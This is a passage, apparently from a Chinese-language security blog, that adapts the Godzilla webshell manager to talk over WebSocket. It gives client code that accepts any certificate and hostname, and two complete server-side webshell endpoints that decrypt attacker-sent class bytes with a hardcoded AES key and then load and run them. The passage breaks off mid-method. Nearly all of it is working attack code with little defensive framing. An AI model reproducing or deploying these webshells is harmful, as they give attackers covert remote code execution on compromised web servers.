class="built_in">this</span>.shellContext.getHeaders().get(<span class="string">&quot;Cookie&quot;</span>);  </span><br><span class="line">                <span class="keyword">if</span> (cookieStr == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    cookieStr = <span class="built_in">this</span>.shellContext.getHeaders().get(<span class="string">&quot;cookie&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">if</span> (cookieStr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    String[] cookies;  </span><br><span class="line">                    <span class="keyword">for</span> (String cookieStr2 : cookies = cookieStr.split(<span class="string">&quot;;&quot;</span>)) &#123;  </span><br><span class="line">                        String[] cookieAtt = cookieStr2.split(<span class="string">&quot;=&quot;</span>);  </span><br><span class="line">                        <span class="keyword">if</span> (cookieAtt.length != <span class="number">2</span>) <span class="keyword">continue</span>;  </span><br><span class="line">                        <span class="type">HttpCookie</span> <span class="variable">httpCookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpCookie</span>(cookieAtt[<span class="number">0</span>], cookieAtt[<span class="number">1</span>]);  </span><br><span class="line">                        <span class="built_in">this</span>.cookieManager.getCookieStore().add(<span class="built_in">this</span>.getUri(), httpCookie);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.cookieManager;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        WebSocket.trustAllHttpsCertificates();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAnyHostnameVerifier</span> <span class="keyword">implements</span> <span class="title class_">HostnameVerifier</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">miTM</span> <span class="keyword">extends</span> <span class="title class_">X509ExtendedTrustManager</span> <span class="keyword">implements</span> <span class="title class_">TrustManager</span>, X509TrustManager &#123;  </span><br><span class="line">        ......  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketResponse</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> responseCode;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; headers;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] result;</span><br><span class="line">    <span class="keyword">private</span> ShellEntity shellEntity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebSocketResponse</span><span class="params">(ShellEntity shellEntity, <span class="type">int</span> responseCode, Map&lt;String, List&lt;String&gt;&gt; headers, <span class="type">byte</span>[] result)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.shellEntity = shellEntity;</span><br><span class="line">        <span class="built_in">this</span>.responseCode = responseCode;</span><br><span class="line">        <span class="built_in">this</span>.headers = headers;</span><br><span class="line">        <span class="built_in">this</span>.result = Decrypte(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getResponseCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> responseCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, List&lt;String&gt;&gt; <span class="title function_">getHeaders</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getresult() &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] Decrypte(<span class="type">byte</span>[] Ciphertext) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = <span class="built_in">this</span>.shellEntity.getCryptionModule().decode(Ciphertext);</span><br><span class="line">            <span class="keyword">return</span> decode;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>至于哥斯拉其他需要修改的地方可以自行寻找调用http的地方，然后平行增加个WebSocket的调用就行了。比较简单。</p>
<p>那JavaWebSocket的初始化部分就可以改成如下，增加一个握手的过程即可，然后用webbsocket的方法去发送大马。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625104814403.png"></p>
<h4 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h4><p>至于我们应该放在服务端的小马可以写成如下，这只是个简单的demo，可以进行改进。</p>
<h5 id="Base64类型"><a href="#Base64类型" class="headerlink" title="Base64类型"></a>Base64类型</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64WebSocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Session session;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;082e34fbef497bb1&quot;</span>; <span class="comment">// key  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerValue</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);  </span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig config)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.session = session;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onOpen method is invoked&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.session.setMaxBinaryMessageBufferSize(<span class="number">1024</span> * <span class="number">1024</span>);  </span><br><span class="line">        <span class="built_in">this</span>.session.setMaxTextMessageBufferSize(<span class="number">1024</span> * <span class="number">1024</span>);  </span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>); <span class="comment">// 注册消息处理器  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;onMessage method is invoked&quot;</span>);  </span><br><span class="line">            String[] split = message.split(<span class="string">&quot;=&quot;</span>);  </span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (split[<span class="number">0</span>] != <span class="literal">null</span> &amp;&amp; split[<span class="number">0</span>].equals(pass)) &#123;  </span><br><span class="line">                <span class="type">byte</span>[] data = base64Decode(URLDecoder.decode(split[<span class="number">1</span>], <span class="string">&quot;UTF-8&quot;</span>));  </span><br><span class="line">                data = x(data, <span class="literal">false</span>);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (store.get(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    store.put(<span class="string">&quot;payload&quot;</span>, defineClass(data));  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    store.put(<span class="string">&quot;parameters&quot;</span>, data);  </span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class&lt;?&gt;) store.get(<span class="string">&quot;payload&quot;</span>)).newInstance();  </span><br><span class="line">                    f.equals(arrOut);  </span><br><span class="line">                    f.equals(data);  </span><br><span class="line">                    result.append(md5.substring(<span class="number">0</span>, <span class="number">16</span>));  </span><br><span class="line">                    f.toString();  </span><br><span class="line">                    result.append(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));  </span><br><span class="line">                    result.append(md5.substring(<span class="number">16</span>));  </span><br><span class="line">                &#125;  </span><br><span class="line">                session.getBasicRemote().sendText(result.toString());  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, javax.websocket.CloseReason closeReason)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onclose method is invoked\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable thr)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onerror method is invoked\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            MessageDigest m;  </span><br><span class="line">            m = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);  </span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());  </span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> ret;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Raw类型"><a href="#Raw类型" class="headerlink" title="Raw类型"></a>Raw类型</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RawWebSocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;<span class="type">byte</span>[]&gt; &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Session session;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;082e34fbef497bb1&quot;</span>; <span class="comment">// key  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerValue</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);  </span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig config)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.session = session;  </span><br><span class="line">        System.out.println(<span class="string">&quot;onOpen method is invoked raw&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.session.setMaxBinaryMessageBufferSize(<span class="number">1024</span> * <span class="number">1024</span>);  </span><br><span class="line">        <span class="built_in">this</span>.session.setMaxTextMessageBufferSize(<span class="number">1024</span> * <span class="number">1024</span>);  </span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>); <span class="comment">// 注册消息处理器  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(<span class="type">byte</span>[] message)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;onMessage method is invoked&quot;</span>);  </span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">byte</span>[] data = message;  </span><br><span class="line">            data = x(data, <span class="literal">false</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (store.get(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;  </span><br><span class="line">                store.put(<span class="string">&quot;payload&quot;</span>, defineClass(data));  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                store.put(<span class="string">&quot;parameters&quot;</span>, data);  </span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class&lt;?&gt;) store.get(<span class="string">&quot;payload&quot;</span>)).newInstance();  </span><br><span class="line">                f.equals(arrOut);  </span><br><span class="line">                f.equals(data);  </span><br><span class="line">                f.toString();  </span><br><span class="line">                result.write(x(arrOut.toByteArray(), <span class="literal">true</span>));  </span><br><span class="line">            &#125;  </span><br><span class="line">            session.getBasicRemote().sendBinary(ByteBuffer.wrap(result.toByteArray()));  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  